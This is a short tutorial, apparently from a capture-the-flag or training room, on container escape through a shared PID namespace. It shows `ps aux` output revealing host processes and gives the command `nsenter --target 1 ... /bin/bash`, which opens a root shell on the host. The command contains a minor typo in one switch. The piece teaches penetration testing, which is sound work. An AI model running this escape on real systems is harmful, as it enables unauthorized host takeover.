Namespaces segregate system resources such as processes, files, and memory away from other namespaces. Every process running on Linux will be assigned two things:
- A namespace
- A Process Identifier (PID)

Namespaces are also the reason how containerization is achieved! Processes can only "see" the process in the same namespace.
## Determine if We're in a Container Process
Using the command `ps aux`, we can list the current processes that are running. The difference in the number of processes is usually a great indicator that we're in a container. However, this is not 100% indicative. There are cases where, ironically, you want the container to be able to interact directly with the host.
## Exploit
We will abuse a situation where the container will share the same namespace as the host OS. You might see this in cases where the container relies on a process running or needs to "plug in" to the host such as the use of debugging tools. In these situations, you can expect to see the host's processes in the container when listing them via `ps aux`.
```
root@demo-container:~# ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.1  0.5 102796 11372 ?        Ss   11:40   0:03 /sbin/init
root           2  0.0  0.0      0     0 ?        S    11:40   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   11:40   0:00 [rcu_gp]
-- cut for brevity --
root        2119  0.0  0.1 1148348 3372 ?        Sl   12:00   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 22 -container-ip 172.17.0.2 -container
root        2125  0.0  0.1 1148348 3392 ?        Sl   12:00   0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 22 -container-ip 172.17.0.2 -container-port
root        2141  0.0  0.4 712144  9192 ?        Sl   12:00   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 2032326e64254786be0a420199ef845d8f97afccba9e2e
root        2163  0.0  0.2  72308  5644 ?        Ss   12:00   0:00 /usr/sbin/sshd -D
```

Using the `nsenter` (namespace enter) command, allows us to execute or start processes, and place them within the same namespace as other process. For this example, we will be abusing the fact that the container can see the `/sbin/init` process on the host, meaning that we can launch new commands such as a bash shell on the host.

The command for this exploit will be: `nsenter --target 1 --mount -uts --ipc --net /bin/bash`.

1. We use the `--target` switch with the value of `1` to execute our shell command that we later provide to execute in the namespace of the special system process ID to get the ultimate root!
2. Specifying `--mount` this is where we provide the mount namespace of the process that we are targeting. "If no file is specified, enter the mount namespace of the target process." [(Man.org., 2013)](https://man7.org/linux/man-pages/man1/nsenter.1.html).
3. The `--uts` switch allows us to share the same UTS namespace as the target process meaning the same hostname is used. This is important as mismatching hostnames can cause connection issues (especially with network services).
4. The `--ipc` switch means that we enter the Inter-process Communication namespace of the process which is important. This means that memory can be shared.
5. The `--net` switch means that we enter the network namespace meaning that we can interact with network-related features of the system. For example, the network interfaces. We can use this to open up a new connection (such as a stable reverse shell on the host).
6. As we are targeting the `/sbin/init` process #1 (although it's a symbolic link to `lib/systemd/systemd` for backwards compatibility), we are using the namespace and permissions of the systemd daemon for our new process (the shell)
7. Here's where our process will be executed into this privileged namespace: `sh` or a shell. This will execute in the same namespace (and therefore privileges) of the kernel.